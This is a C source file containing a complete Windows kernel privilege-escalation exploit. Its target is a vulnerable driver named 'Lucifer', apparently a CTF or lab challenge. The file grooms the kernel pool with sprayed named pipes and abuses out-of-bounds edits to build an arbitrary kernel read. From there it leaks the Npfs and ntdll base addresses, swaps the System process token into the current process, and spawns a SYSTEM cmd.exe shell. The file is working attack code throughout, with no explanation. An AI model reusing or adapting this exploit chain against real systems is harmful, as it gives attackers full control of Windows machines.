#include "../Banzi/banzi.h"

#define ADD		0x222000
#define DELE	0x22200C
#define EDIT	0x222004
#define SHOW	0x222008

typedef struct request {
	DWORD64 idx;
	DWORD64 check;
	DWORD64 value;
}request;

void add() {
	DWORD retLength = 0;
	DeviceIoControl(hDevice, ADD, NULL, 0,NULL, 0, &retLength, NULL);
}

void dele() {
	DWORD retLength = 0;
	DeviceIoControl(hDevice, DELE, NULL, 0, NULL, 0, &retLength, NULL);
}

void edit(DWORD64 idx, DWORD64 value) {
	DWORD retLength = 0;
	request req = { idx, 0xDADADDAA, value };
	DeviceIoControl(hDevice, EDIT, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

void show(DWORD64 idx, DWORD64* value) {
	DWORD retLength = 0;
	request req = { idx, 0xDADADDAA, 0 };
	request out = { 0, 0, 0 };
	DeviceIoControl(hDevice, EDIT, &req, sizeof(request), &out, sizeof(request), &retLength, NULL);
	*value = out.value;
}

char* fakeIrp  = NULL;
HANDLE ghost_handle_r = INVALID_HANDLE_VALUE;
HANDLE ghost_handle_w = INVALID_HANDLE_VALUE;

void arb_read(DWORD64 addr, void* buffer, int len) {
	*(DWORD64*)(fakeIrp + 0x18) = addr;
	peekPipe(ghost_handle_r, (char*)buffer, len);
}

int main() {
	char inBuffer[0x1000] = { 0 };
	char outBuffer[0x1000] = { 0 };
	DWORD retLenth = 0;
	
	init("\\\\.\\Lucifer");
//	canSprayObjects();
	fakeIrp = (char*)malloc(0x1000);
	memset(fakeIrp, '\x00', 0x1000);

	PPIPE_HANDLES groom_pool_pipes = initSprayNamedPipe(0x410, 0x2000);
	PPIPE_HANDLES victim_pipes = initSprayNamedPipe(0x210, 0x1000);

	sprayNpFrByPipe(groom_pool_pipes, NULL);

	memset(inBuffer, 'B', sizeof(inBuffer));
	*(DWORD64*)(inBuffer + 0x00) = 0xdeadbeefdeadbeef;
	for (int i = 0; i < victim_pipes->nums; i++) {

		if (i == victim_pipes->nums / 3) {
			add();
		}

		*(DWORD64*)(inBuffer + 0x08) = 0xdeadbeef00000000 + i;
		WriteFile(victim_pipes->handles[i].w, inBuffer, victim_pipes->size - 0x40, &retLenth, NULL);

		i++;

		*(DWORD64*)(inBuffer + 0x08) = 0xdeadbeef00000000 + i;
		WriteFile(victim_pipes->handles[i].w, inBuffer, victim_pipes->size - 0x40, &retLenth, NULL);

		if (i == victim_pipes->nums / 3) {
			add();
		}
	}

	
	info("[+] Check pool layout");
	DWORD64 vuln_idx = -1;
	DWORD64 leak_idx = -1;
	{
		edit(0x480 / 8, 0xbeefdeadbeefdead);
		for (int i = 0; i < victim_pipes->nums; i++) {
			memset(outBuffer, '\x00', 0x10);
			peekPipe(victim_pipes->handles[i].r, outBuffer, 0x10);
			DWORD64 check = *(DWORD64*)outBuffer;
			if (check == 0xbeefdeadbeefdead) {
				vuln_idx = *(DWORD64*)(outBuffer + 0x8) - 0xdeadbeef00000000;
				break;
			}
		}


		if (vuln_idx == -1) {
			err_exit("Failed to construct target pool layout");
		}

		edit(0x6a0 / 8, 0xbeefdeadbeefdead);
		for (int i = 0; i < victim_pipes->nums; i++) {
			memset(outBuffer, '\x00', 0x10);
			peekPipe(victim_pipes->handles[i].r, outBuffer, 0x10);
			DWORD64 check = *(DWORD64*)outBuffer;
			if (check == 0xbeefdeadbeefdead) {
				leak_idx = *(DWORD64*)(outBuffer + 0x8) - 0xdeadbeef00000000;
				if (leak_idx != vuln_idx) {
					break;
				}
				else {
					leak_idx = -1;
				}
			}
		}
	}
	
	if (leak_idx == -1) {
		err_exit("Failed to construct target pool layout");
	}
	
	info("[+] leak some kernel addresses");
	DWORD64 leak_ccb = 0;
	edit(0x470 / 8, 0x80000000000);
	edit(0x470 / 8 + 1, 0x800);

	memset(outBuffer, '\x00', sizeof(outBuffer));
	peekPipe(victim_pipes->handles[vuln_idx].r, outBuffer, 0x500);
	leak_ccb = *(DWORD64*)(outBuffer + 0x1f0) - 0xa8;
	info("  [+] leak pipe ccb address: %#llx", leak_ccb);

	ghost_handle_r = victim_pipes->handles[vuln_idx].r;
	edit(0x460 / 8, (DWORD64)fakeIrp);
	edit(0x470 / 8, 0x1d000000001);
	edit(0x470 / 8 + 1, 0x1d0);
	DWORD64 leak_chunk_addr = 0;
	DWORD64 vuln_chunk_addr = 0;
	DWORD64 file_object_addr = 0;
	DWORD64 device_object_addr = 0;
	DWORD64 driver_object_addr = 0;
	DWORD64 NpFsdCreate = 0;
	DWORD64 Npfs_base = 0;
	DWORD64 ntdll_base = 0;

	arb_read(leak_ccb + 0xa8, &leak_chunk_addr, 8);
	vuln_chunk_addr = leak_chunk_addr - 0x220 - 0x450;
	info("  [+] vuln chunk address: %#llx", vuln_chunk_addr);

	arb_read(leak_ccb + 0x30, &file_object_addr, 8);
	arb_read(file_object_addr + 0x8, &device_object_addr, 8);

	if (device_object_addr == 0) {
		arb_read(leak_ccb + 0x38, &file_object_addr, 8);
		arb_read(file_object_addr + 0x8, &device_object_addr, 8);
	}
	arb_read(device_object_addr + 0x8, (void*)&driver_object_addr, 8);
	arb_read(driver_object_addr + 0x70, (void*)&NpFsdCreate, 8);
	Npfs_base = NpFsdCreate - 0xb540;
	info("  [+] Npfs base address: %#llx", Npfs_base);

	arb_read(Npfs_base + 0x7370, (void*)&ntdll_base, 8);
	ntdll_base -= 0x0025ac90;
	info("  [+] ntdll base address: %#llx", ntdll_base);

	arb_read(ntdll_base + 0x00cfc420, (void*)&kAddress.sysProc, 8);
	arb_read(kAddress.sysProc + 0x4b8, (void*)&kAddress.sysToken, 8);
	uint64_t curPid = GetCurrentProcessId();
	uint64_t searchAddr = kAddress.sysProc;
	while (TRUE) {
		uint64_t searchPid = 0;
		arb_read(searchAddr + 0x440, (void*)&searchPid, 8);
		if (searchPid == curPid) {
			kAddress.curProc = searchAddr;
			arb_read(kAddress.curProc + 0x4b8, (void*)&kAddress.curToken, 8);
			break;
		}
		arb_read(searchAddr + 0x448, (void*)&searchAddr, 8);
		searchAddr -= 0x448;
	}

	info("  [+] Current process EPROCESS: %#llx", kAddress.curProc);
	info("  [+] Current process TOKEN: %#llx", kAddress.curToken);
	info("  [+] System process TOKEN: %#llx", kAddress.sysToken);

	DWORD64 header = 0;
	arb_read(kAddress.sysToken - 0x30, &header, 8);

	edit(0x460 / 8, 0);
	edit(0x470 / 8, 0x1d000000000);
	edit(0x470 / 8 + 1, 0x1d0);
	
	edit((kAddress.sysToken - 0x30 - vuln_chunk_addr) / 8, header + 0x10);
	edit((kAddress.curProc + 0x4b8 - vuln_chunk_addr) / 8, kAddress.sysToken);
	
//	puts("[+] EXP NERVER END!");
	system("cmd.exe");
	getchar();
	return 0;
}
